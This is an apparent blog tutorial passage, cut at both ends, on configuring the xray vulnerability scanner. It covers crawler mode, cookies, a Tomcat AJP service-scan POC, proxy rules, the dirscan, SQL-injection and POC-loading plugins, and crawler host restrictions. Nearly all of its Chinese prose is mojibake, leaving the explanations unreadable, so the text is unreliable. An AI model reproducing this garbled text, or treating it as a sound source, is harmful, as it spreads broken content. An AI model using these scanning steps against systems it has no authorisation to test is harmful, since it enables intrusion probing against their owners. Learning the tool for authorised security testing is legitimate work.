t.comã€*.t.comã€1.1.1.1ã€1.1.1.1/24ã€1.1-4.1.1-8</span><br></code></pre></td></tr></table></figure><p>ç„¶åæ¸¸è§ˆé¡µé¢å³å¯ï¼Œè‹¥æ²¡æœ‰<code>config.yaml</code>åˆ™å…ˆè¿è¡Œä¸€æ¬¡xray</p><h3 id="åŸºç¡€çˆ¬è™«æ¨¡å¼"><a href="#åŸºç¡€çˆ¬è™«æ¨¡å¼" class="headerlink" title="åŸºç¡€çˆ¬è™«æ¨¡å¼"></a>åŸºç¡€çˆ¬è™«æ¨¡å¼</h3><blockquote><p>çˆ¬è™«æ¨¡å¼æ˜¯æ¨¡æ‹Ÿäººå·¥å»ç‚¹å‡»ç½‘é¡µçš„é“¾æ¥ï¼Œç„¶åå»åˆ†ææ‰«æï¼Œçˆ¬è™«ä¸éœ€è¦äººå·¥çš„ä»‹å…¥ï¼Œè®¿é—®é€Ÿåº¦è¦å¿«å¾ˆå¤šï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›ç¼ºç‚¹</p><ul><li>xray çš„åŸºç¡€çˆ¬è™«ä¸èƒ½å¤„ç† js æ¸²æŸ“çš„é¡µé¢</li></ul></blockquote><p><code>./xray webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html</code></p><h4 id="é…ç½®Cookie"><a href="#é…ç½®Cookie" class="headerlink" title="é…ç½®Cookie"></a>é…ç½®Cookie</h4><p>é…ç½®æ–‡ä»¶<code>config.yaml</code>é‡Œï¼Œ<code>http</code> é…ç½®éƒ¨åˆ†çš„ <code>headers</code> é¡¹:</p><p>æ·»åŠ ä¸€æ¡Cookieï¼Œå¦‚</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">headers:</span><br><span class="hljs-symbol">  Cookie:</span> key=value<br></code></pre></td></tr></table></figure><p>ä¾‹å­</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><br>  ...<br> <br><span class="hljs-symbol">  headers:</span><br><span class="hljs-symbol">    Cookie:</span> sysauth=xxxxx<br></code></pre></td></tr></table></figure><h3 id="æœåŠ¡æ‰«æ"><a href="#æœåŠ¡æ‰«æ" class="headerlink" title="æœåŠ¡æ‰«æ"></a>æœåŠ¡æ‰«æ</h3><blockquote><p>ç›®å‰ä¸»è¦æ˜¯æœåŠ¡æ‰«æç›¸å…³çš„pocï¼Œç›®å‰åªæœ‰ä¸€ä¸ª tomcat-cve-2020-1938 ajp åè®®ä»»æ„æ–‡ä»¶æ£€æµ‹ pocã€‚</p></blockquote><p>targetå‚æ•°æ”¯æŒip:portæ–¹å¼ï¼Œå’Œ xxx.fileæ–¹å¼</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./xray</span> servicescan <span class="hljs-params">--target</span> 127.0.0.1<span class="hljs-function">:8009</span><br><span class="hljs-string">./xray</span> servicescan <span class="hljs-params">--target</span> xxx.file<br></code></pre></td></tr></table></figure><p>xxx.fileæ ¼å¼ï¼Œä¸€è¡Œä¸€ä¸ªip:portç›®æ ‡ï¼Œè¿›è¡Œæ‰¹é‡å¯¼å…¥</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:8009</span><br><span class="hljs-number">10.1.1.1:8099</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä¸åŒçš„å¯¼å‡ºæ–¹å¼</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sas">NAME:<br>    servicescan - Run a service scan task<br><br>USAGE:<br>    servicescan [command <span class="hljs-meta">options</span>] [arguments...]<br><br><span class="hljs-meta">OPTIONS</span>:<br>   --target value          æŒ‡å®šå•ä¸€ç›®æ ‡ï¼Œä¾‹å­: host:8009<br>   --target-<span class="hljs-meta">file</span> value     ä»æ–‡ä»¶åŠ è½½ç›®æ ‡ï¼Œä¸€ç›®æ ‡ä¸€è¡Œ<br>   --json-<span class="hljs-meta">output</span> <span class="hljs-meta">FILE</span>      ä½¿ç”¨jsonæ ¼å¼å¯¼å‡ºxrayç»“æœ<br>   --webhook-<span class="hljs-meta">output</span> value  ç”¨jsonæ ¼å¼post xrayç»“æœåˆ°æŸurl<br>   --html-<span class="hljs-meta">output</span> <span class="hljs-meta">FILE</span>      ç”¨htmlæ ¼å¼å¯¼å‡ºæŠ¥å‘Š<br></code></pre></td></tr></table></figure><h2 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h2><h3 id="HTTP-é…ç½®"><a href="#HTTP-é…ç½®" class="headerlink" title="HTTP é…ç½®"></a>HTTP é…ç½®</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><br><span class="hljs-symbol">  proxy:</span> <span class="hljs-string">&quot;&quot;</span>                             <span class="hljs-meta"># æ¼æ´æ‰«ææ—¶ä½¿ç”¨çš„ä»£ç†ï¼Œå¦‚: http:<span class="hljs-comment">//127.0.0.1:8080ã€‚ å¦‚éœ€è®¾ç½®å¤šä¸ªä»£ç†ï¼Œè¯·ä½¿ç”¨ proxy_rule æˆ–è‡ªè¡Œåˆ›å»ºä¸Šå±‚ä»£ç†</span></span><br><span class="hljs-symbol">  proxy_rule:</span> []                        <span class="hljs-meta"># æ¼æ´æ‰«æä½¿ç”¨å¤šä¸ªä»£ç†çš„é…ç½®è§„åˆ™, å…·ä½“è¯·å‚ç…§æ–‡æ¡£</span><br></code></pre></td></tr></table></figure><h3 id="ä»£ç†é…ç½®"><a href="#ä»£ç†é…ç½®" class="headerlink" title="ä»£ç†é…ç½®"></a>ä»£ç†é…ç½®</h3><p>æ”¯æŒ <code>http</code>, <code>https</code> å’Œ <code>socks5</code> ä¸‰ç§æ ¼å¼ï¼Œå¦‚:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1111</span><br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1111</span><br>socks5:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä»£ç†éœ€è¦è®¤è¯ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ ¼å¼ <code>http://user:password@127.0.0.1:1111</code></p><h3 id="å¤šä»£ç†é…ç½®"><a href="#å¤šä»£ç†é…ç½®" class="headerlink" title="å¤šä»£ç†é…ç½®"></a>å¤šä»£ç†é…ç½®</h3><p>ä¸åŒçš„åŸŸåä½¿ç”¨ä¸åŒçš„ä»£ç†ï¼Œè®¾ç½®å¤šä¸ªä»£ç†åˆ‡æ¢ç­‰ï¼Œå¯ä»¥é€šè¿‡ <code>proxy_rule</code> å­—æ®µæ¥é…ç½®ã€‚==Proxy é…ç½®å°†ä¼˜å…ˆäºæœ¬é…ç½®ã€‚==</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">proxy_rule:<br>  - <span class="hljs-keyword">match</span>: <span class="hljs-string">&quot;*host1&quot;</span><br>    server<span class="hljs-variable">s:</span><br>      - addr: <span class="hljs-string">&quot;http://127.0.0.1:8001&quot;</span><br>        weigh<span class="hljs-variable">t:</span> <span class="hljs-number">1</span><br>      - addr: <span class="hljs-string">&quot;http://127.0.0.1:8002&quot;</span><br>        weigh<span class="hljs-variable">t:</span> <span class="hljs-number">2</span><br>  - <span class="hljs-keyword">match</span>: <span class="hljs-string">&quot;*&quot;</span><br>    server<span class="hljs-variable">s:</span><br>      - addr: <span class="hljs-string">&quot;http://127.0.0.1:8003&quot;</span><br>        weigh<span class="hljs-variable">t:</span> <span class="hljs-number">1</span><br>      - addr: <span class="hljs-string">&quot;http://127.0.0.1:8004&quot;</span><br>        weigh<span class="hljs-variable">t:</span> <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><ul><li>match: è¯·æ±‚çš„ url çš„ä¸»æœºåå¦‚æœåŒ¹é…ï¼Œå°±ä½¿ç”¨æœ¬æ¡è§„åˆ™ã€‚<ul><li>å¦‚æœæ˜¯ <code>*</code>ï¼Œåˆ™ä»£è¡¨å¯ä»¥åŒ¹é…æ‰€æœ‰ã€‚æ‰€ä»¥ä¸€å®šè¦å°† <code>*</code> æ”¾åœ¨æœ€åé¢ï¼Œä¸Šé¢æ²¡æœ‰åŒ¹é…åˆ°çš„åŸŸåéƒ½å°†ä½¿ç”¨è¿™ä¸ªé…ç½®ã€‚</li><li>å¦‚æœæ²¡æœ‰ä»»ä½•ä¸€æ¡å¯ä»¥åŒ¹é…ï¼Œè¿™ä¸ªè¯·æ±‚å°†ä¸ä¼šä½¿ç”¨ä»£ç†ã€‚</li></ul></li><li>addr: ä»£ç†æœåŠ¡å™¨çš„åœ°å€ï¼ŒåŒ <code>proxy</code> çš„é…ç½®ã€‚</li><li>weight: ä»£ç†æœåŠ¡å™¨çš„æƒé‡ï¼Œå¦‚æœ <code>servers</code> ä¸­é…ç½®äº†å¤šä¸ªä»£ç†æœåŠ¡å™¨ï¼Œè®¾ç½®æƒé‡å¯ä»¥å‡è¡¡è´Ÿè½½ï¼Œæ¯”å¦‚æƒé‡æ˜¯ <code>3:7</code>ï¼Œåˆ™ä»£è¡¨æ¯ 10 ä¸ªè¯·æ±‚ï¼Œæœ‰ 3 ä¸ªé€‰æ‹© server1ï¼Œæœ‰ 7 ä¸ªé€‰æ‹© server2ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯ round bin ç®—æ³•ï¼Œå‰ 3 ä¸ªä¸€å®šå‘å¾€ server1ï¼Œåé¢ 7 ä¸ªä¸€å®šå‘å¾€ server2ï¼Œç„¶åç»§ç»­å¾ªç¯ï¼Œä¸æ˜¯æ¯ä¸ªè¯·æ±‚éƒ½æ˜¯åŸºäºæƒé‡éšæœºçš„ã€‚</li></ul><h3 id="æ’ä»¶é…ç½®"><a href="#æ’ä»¶é…ç½®" class="headerlink" title="æ’ä»¶é…ç½®"></a>æ’ä»¶é…ç½®</h3><h4 id="dirscan"><a href="#dirscan" class="headerlink" title="dirscan"></a>dirscan</h4><ul><li><code>depth</code> æ·±åº¦é™åˆ¶</li><li><code>dictionary</code> é…ç½®ç›®å½•å­—å…¸, éœ€è¦æ˜¯ç»å¯¹è·¯å¾„, é…ç½®åå°†ä¸å†…ç½®å­—å…¸<strong>åˆå¹¶</strong></li></ul><p><code>depth</code> æ˜¯æ¢æµ‹æ·±åº¦, é»˜è®¤ä¸º 1, å³åªåœ¨ URL æ·±åº¦ä¸º 0, å’Œæ·±åº¦ä¸º 1 æ—¶è¿è¡Œè¯¥æ’ä»¶ï¼ˆå‰ææ˜¯å¯ç”¨äº†è¯¥æ’ä»¶)</p><p>å®šä¹‰ <code>http://example.com/</code>ï¼Œæ·±åº¦ä¸º 0ï¼Œå®šä¹‰ <code>http://example.com/a/</code>, æ·±åº¦ä¸º 1ã€‚ åœ¨è¿™ç§é…ç½®ä¸‹ï¼Œdirscan å°†å¯¹</p><p><code>http://example.com/</code> å’Œ <code>http://example.com/a/</code> åšä¸¤æ¬¡æ‰«æï¼Œå¦‚æœå­˜åœ¨ <code>http://example.com/a/example.zip</code> é‚£ä¹ˆå°±èƒ½å°†å…¶æ‰«æå‡ºæ¥ã€‚</p><h4 id="sqldet"><a href="#sqldet" class="headerlink" title="sqldet"></a>sqldet</h4><p>ä¸‹é¢è¿™ä¸ªé€‰é¡¹å¾ˆ<strong>å±é™©</strong>ï¼Œå¼€å¯ä¹‹åå¯ä»¥å¢åŠ æ£€æµ‹ç‡ï¼Œä½†æ˜¯æœ‰ç ´åæ•°æ®åº“æ•°æ®çš„å¯èƒ½æ€§ï¼Œè¯·åŠ¡å¿…äº†è§£å·¥ä½œåŸç†ä¹‹åå†å¼€å¯</p><ul><li><code>dangerously_use_comment_in_sql</code> å…è®¸æ£€æŸ¥æ³¨å…¥çš„æ—¶å€™ä½¿ç”¨æ³¨é‡Š</li></ul><h4 id="phantasm"><a href="#phantasm" class="headerlink" title="phantasm"></a>phantasm</h4><p>xray çš„ poc æ¡†æ¶ï¼Œåœ¨å…¶ä¸‹è¿è¡Œç€è®¸å¤š yaml å’Œ go å†™çš„ pocï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¯¥æ¨¡å—ç¼–å†™è‡ªå·±çš„ poc å¹¶è®© xray åŠ è½½ï¼Œå…·ä½“è§ è‡ªå®šä¹‰POCè¯­æ³•</p><p>ä¸¤ä¸ªé‡ç‚¹é…ç½®:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">depth:</span> <span class="hljs-number">1</span>                            <span class="hljs-meta"># ä¸ dirscan ä¸€æ ·ï¼Œä¸å†èµ˜è¿°</span><br><span class="hljs-symbol">exclude_poc:</span> []                     <span class="hljs-meta"># æ’é™¤å“ªäº› poc, æ”¯æŒ glob è¯­æ³•, å¦‚: /home/poc/*thinkphp* æˆ– poc-yaml-weblogic*</span><br><span class="hljs-symbol">local_poc:</span> []                       <span class="hljs-meta"># åŠ è½½æœ¬åœ°çš„ poc, æ”¯æŒ glob è¯­æ³•, å¦‚ï¼š /home/poc/*</span><br></code></pre></td></tr></table></figure><p><code>exclude_poc</code> ç”¨äºå»é™¤åŠ è½½å“ªäº› pocã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">plugins:</span><br>  <span class="hljs-string">...</span><br>  <span class="hljs-attr">phantasm:</span><br>    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">exclude_poc:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">poc-yaml-bad-poc</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">*bad-poc*</span><br></code></pre></td></tr></table></figure><p><code>local_poc</code> æ˜¯ç”¨äºåŠ è½½æœ¬åœ°çš„ poc çš„é…ç½®ï¼Œæœ€å¥½æŒ‡å®šç»å¯¹è·¯å¾„ï¼Œä¸”åŒæ ·æ”¯æŒ glob è¯­æ³•ã€‚</p><p>ä¸€ä¸ªç¨å¾®å¤æ‚çš„æƒ…å†µæ˜¯å°†è¿™ä¸¤ä¸ªæ­é…èµ·æ¥ä½¿ç”¨ï¼Œæ¯”å¦‚:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">plugins:</span><br>  ...<br><span class="hljs-symbol">  phantasm:</span><br><span class="hljs-symbol">    enabled:</span> true<br><span class="hljs-symbol">    exclude_poc:</span><br>    - <span class="hljs-meta-keyword">/home/</span>poc/poc-fake-good-poc<br><span class="hljs-symbol">    local_poc:</span><br>    - <span class="hljs-meta-keyword">/home/</span>poc<span class="hljs-comment">/*good-poc*</span><br></code></pre></td></tr></table></figure><p>ä¸Šè¿°é…ç½®çš„æ„æ€æ˜¯åŠ è½½ <code>/home/poc/</code> ç›®å½•ä¸‹æ‰€æœ‰ç¬¦åˆ <code>*good-poc*</code> è¿™ä¸ªpattern çš„pocï¼ŒåŒæ—¶å»æ‰åŒæ ·ç›®å½•ä¸‹çš„ <code>poc-fake-good-poc</code></p><h3 id="è¢«åŠ¨ä»£ç†é…ç½®"><a href="#è¢«åŠ¨ä»£ç†é…ç½®" class="headerlink" title="è¢«åŠ¨ä»£ç†é…ç½®"></a>è¢«åŠ¨ä»£ç†é…ç½®</h3><p>è¿™éƒ¨åˆ†æ˜¯ä»£ç†æ¨¡å¼çš„é…ç½®</p><h4 id="ä»£ç†å¯ç”¨å¯†ç ä¿æŠ¤"><a href="#ä»£ç†å¯ç”¨å¯†ç ä¿æŠ¤" class="headerlink" title="ä»£ç†å¯ç”¨å¯†ç ä¿æŠ¤"></a>ä»£ç†å¯ç”¨å¯†ç ä¿æŠ¤</h4><p>å¯¹åº”äº <code>auth</code> ä¸­çš„é…ç½®ã€‚</p><p>æ”¯æŒç»™ä»£ç†é…ç½®åŸºç¡€è®¤è¯çš„å¯†ç ï¼Œå½“è®¾ç½®å¥½ <code>auth</code> ä¸­çš„ <code>username</code> å’Œ <code>password</code> åï¼Œä½¿ç”¨ä»£ç†æ—¶æµè§ˆå™¨ä¼šå¼¹æ¡†è¦æ±‚è¾“å‡ºç”¨æˆ·åå¯†ç ï¼Œè¾“å…¥æˆåŠŸåä»£ç†æ‰å¯æ­£å¸¸ä½¿ç”¨ã€‚</p><h4 id="é™åˆ¶å…è®¸ä½¿ç”¨è¯¥ä»£ç†çš„ip"><a href="#é™åˆ¶å…è®¸ä½¿ç”¨è¯¥ä»£ç†çš„ip" class="headerlink" title="é™åˆ¶å…è®¸ä½¿ç”¨è¯¥ä»£ç†çš„ip"></a>é™åˆ¶å…è®¸ä½¿ç”¨è¯¥ä»£ç†çš„ip</h4><p><code>allow_ip_range</code> ï¼Œé™åˆ¶å“ªäº›ipå¯ä»¥ä½¿ç”¨è¯¥ä»£ç†ã€‚æ”¯æŒå•ä¸ª IP å’Œ CIDR æ ¼å¼çš„åœ°å€ï¼Œå¦‚ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">allow_ip_range:</span> [<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;192.168.1.1/24&quot;</span>]<br></code></pre></td></tr></table></figure><p>ç•™ç©ºåˆ™å…è®¸æ‰€æœ‰åœ°å€è®¿é—®</p><h4 id="é™åˆ¶æ‰«æèŒƒå›´"><a href="#é™åˆ¶æ‰«æèŒƒå›´" class="headerlink" title="é™åˆ¶æ‰«æèŒƒå›´"></a>é™åˆ¶æ‰«æèŒƒå›´</h4><p><code>restriction</code>ä¸­ï¼Œallowedå³ä¸ºå…è®¸è®¿é—®çš„ï¼Œdisallowedå³ä¸ºä¸å…è®¸çš„ã€‚å¦‚</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">hostname_allowed: []                # å…è®¸è®¿é—®çš„ Hostnameï¼Œæ”¯æŒæ ¼å¼å¦‚ t.comã€*.t.comã€<span class="hljs-number">1.1.1.1</span>ã€<span class="hljs-number">1.1.1.1</span>/<span class="hljs-number">24ã€1.1-4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>-<span class="hljs-number">8</span><br>hostname_disallowed:                # ä¸å…è®¸è®¿é—®çš„ Hostnameï¼Œæ”¯æŒæ ¼å¼å¦‚ t.comã€*.t.comã€<span class="hljs-number">1.1.1.1</span>ã€<span class="hljs-number">1.1.1.1</span>/<span class="hljs-number">24ã€1.1-4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">1</span>-<span class="hljs-number">8</span><br>- &#x27;*google*&#x27;<br></code></pre></td></tr></table></figure><h4 id="ä»£ç†è¯·æ±‚å¤´é…ç½®-proxy-header"><a href="#ä»£ç†è¯·æ±‚å¤´é…ç½®-proxy-header" class="headerlink" title="ä»£ç†è¯·æ±‚å¤´é…ç½® proxy_header"></a>ä»£ç†è¯·æ±‚å¤´é…ç½® <code>proxy_header</code></h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">proxy_header:</span><br><span class="hljs-symbol">    via:</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-meta"># å¦‚æœä¸ä¸ºç©ºï¼Œproxy å°†æ·»åŠ ç±»ä¼¼ Via: 1.1 $some-value-$random çš„ http å¤´</span><br><span class="hljs-symbol">    x_forwarded:</span> false <span class="hljs-meta"># æ˜¯å¦æ·»åŠ  X-Forwarded-&#123;For,Host,Proto,Url&#125; å››ä¸ª http å¤´</span><br></code></pre></td></tr></table></figure><p>å¦‚æœå¼€å¯ proxy_headerï¼Œä»£ç†ä¼šæ·»åŠ  <code>via</code> å¤´å’Œ <code>X-Forwarded-*</code> ç³»åˆ—å¤´ã€‚</p><p>æ¯”å¦‚ <code>curl http://127.0.0.1:1234 -H &quot;Via: test&quot; -H &quot;X-Forwarded-For: 1.2.3.4&quot; -v</code>ï¼Œåç«¯å®é™…æ”¶åˆ°çš„è¯·æ±‚å°†ä¼šæ˜¯</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:1234<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>curl/7.54.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Via</span><span class="hljs-punctuation">: </span>test, 1.1 xray-1fe7f9e5241b2b150f32<br><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>1.2.3.4, 127.0.0.1<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>127.0.0.1:1234<br><span class="hljs-attribute">X-Forwarded-Proto</span><span class="hljs-punctuation">: </span>http<br><span class="hljs-attribute">X-Forwarded-Url</span><span class="hljs-punctuation">: </span>http://127.0.0.1:1234/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br></code></pre></td></tr></table></figure><h4 id="httpçš„ä»£ç†-upstream-proxy"><a href="#httpçš„ä»£ç†-upstream-proxy" class="headerlink" title="httpçš„ä»£ç† upstream_proxy"></a>httpçš„ä»£ç† <code>upstream_proxy</code></h4><p>è¯¥é¡¹é…ç½®ä»…å¯¹ http ä»£ç†æœ¬èº«ç”Ÿæ•ˆï¼Œä¸å¯¹æ¼æ´æ‰«æå‘å‡ºçš„è¯·æ±‚ç”Ÿæ•ˆã€‚æ¼æ‰«çš„ä»£ç†é…ç½®HTTPéƒ¨åˆ†</p><h3 id="åŸºç¡€çˆ¬è™«é…ç½®"><a href="#åŸºç¡€çˆ¬è™«é…ç½®" class="headerlink" title="åŸºç¡€çˆ¬è™«é…ç½®"></a>åŸºç¡€çˆ¬è™«é…ç½®</h3><p>çœ‹é…ç½®å°±è¡Œ</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">basic-crawler:</span><br>  <span class="hljs-attr">max_depth:</span> <span class="hljs-number">0</span>                          <span class="hljs-comment"># æœ€å¤§çˆ¬å–æ·±åº¦ï¼Œ 0 ä¸ºæ— é™åˆ¶</span><br>  <span class="hljs-attr">max_count_of_links:</span> <span class="hljs-number">0</span>                 <span class="hljs-comment"># æœ¬æ¬¡çˆ¬å–æ”¶é›†çš„æœ€å¤§é“¾æ¥æ•°, 0 ä¸ºæ— é™åˆ¶</span><br>  <span class="hljs-attr">allow_visit_parent_path:</span> <span class="hljs-literal">false</span>        <span class="hljs-comment"># æ˜¯å¦å…è®¸çˆ¬å–çˆ¶ç›®å½•, å¦‚æœæ‰«æç›®æ ‡ä¸º t.com/a/ä¸”è¯¥é¡¹ä¸º false, é‚£ä¹ˆå°±ä¸ä¼šçˆ¬å– t.com/ è¿™çº§çš„å†…å®¹</span><br>  <span class="hljs-attr">restriction:</span>                          <span class="hljs-comment"># çˆ¬è™«çš„å…è®¸çˆ¬å–çš„èµ„æºé™åˆ¶, ä¸ºç©ºè¡¨ç¤ºä¸é™åˆ¶ã€‚çˆ¬è™«ä¼šè‡ªåŠ¨æ·»åŠ æ‰«æç›®æ ‡åˆ° Hostname_allowedã€‚</span><br>    <span class="hljs-attr">hostname_allowed:</span> []                <span class="hljs-comment"># å…è®¸è®¿é—®çš„ Hostnameï¼Œæ”¯æŒæ ¼å¼å¦‚ t.comã€*.t.comã€1.1.1.1ã€1.1.1.1/24ã€1.1-4.1.1-8</span><br>    <span class="hljs-attr">hostname_disallowed:</span>                <span class="hljs-comment"># ä¸å…è®¸è®¿é—®çš„ Hostnameï¼Œæ”¯æŒæ ¼å¼å¦‚ t.comã€*.t.comã€1.1.1.1ã€1.1.1.1/24ã€1.1-4.1.1-8</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*google*&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*github*&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*.gov.cn&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*.edu.cn&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*chaitin*&#x27;</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*.xray.cool&#x27;</span><br>    <span class="hljs-attr">port_allowed:</span> []                    <span class="hljs-comment"># å…è®¸è®¿é—®çš„ç«¯å£, æ”¯æŒçš„æ ¼å¼å¦‚: 80ã€80-85</span><br>    <span class="hljs-attr">port_disallowed:</span> []                 <span class="hljs-comment"># ä¸å…è®¸è®¿é—®çš„ç«¯å£, æ”¯æŒçš„æ ¼å¼å¦‚: 80ã€80-85</span><br>    <span class="hljs-attr">path_allowed:</span> []                    <span class="hljs-comment"># å…è®¸è®¿é—®çš„è·¯å¾„ï¼Œæ”¯æŒçš„æ ¼å¼å¦‚: testã€*test*</span><br>    <span class="hljs-attr">path_disallowed:</span> []                 <span class="hljs-comment"># ä¸å…è®¸è®¿é—®çš„è·¯å¾„, æ”¯æŒçš„æ ¼å¼å¦‚: testã€*test*</span><br>    <span class="hljs-attr">query_key_allowed:</span> []               <span class="hljs-comment"># å…è®¸è®¿é—®çš„ Query Keyï¼Œæ”¯æŒçš„æ ¼å¼å¦‚: testã€*test*</span><br>    <span class="hljs-attr">query_key_disallowed:</span> []            <span class="hljs-comment"># ä¸å…è®¸è®¿é—®çš„ Query Key, æ”¯æŒçš„æ ¼å¼å¦‚: testã€*test*</span><br>    <span class="hljs-attr">fragment_allowed:</span> []                <span class="hljs-comment"># å…è®¸è®¿é—®çš„ Fragment, æ”¯æŒçš„æ ¼å¼å¦‚: testã€*test*</span><br>    <span class="hljs-attr">fragment_disallowed:</span> []             <span class="hljs-comment"># ä¸å…è®¸è®¿é—®çš„ Fragment, æ”¯æŒçš„æ ¼å¼å¦‚: testã€*test*</span><br>    <span class="hljs-attr">post_key_allowed:</span> []                <span class="hljs-comment"># å…è®¸è®¿é—®çš„ Post Body ä¸­çš„å‚æ•°, æ”¯æŒçš„æ ¼å¼å¦‚: testã€*test*</span><br>    <span class="hljs-attr">post_key_disallowed:</span> []             <span class="hljs-comment"># ä¸å…è®¸è®¿é—®çš„ Post Body ä¸­çš„å‚æ•°, æ”¯æŒçš„æ ¼å¼å¦‚: testã€*test*</span><br>  <span class="hljs-attr">basic_auth:</span>                           <span class="hljs-comment"># 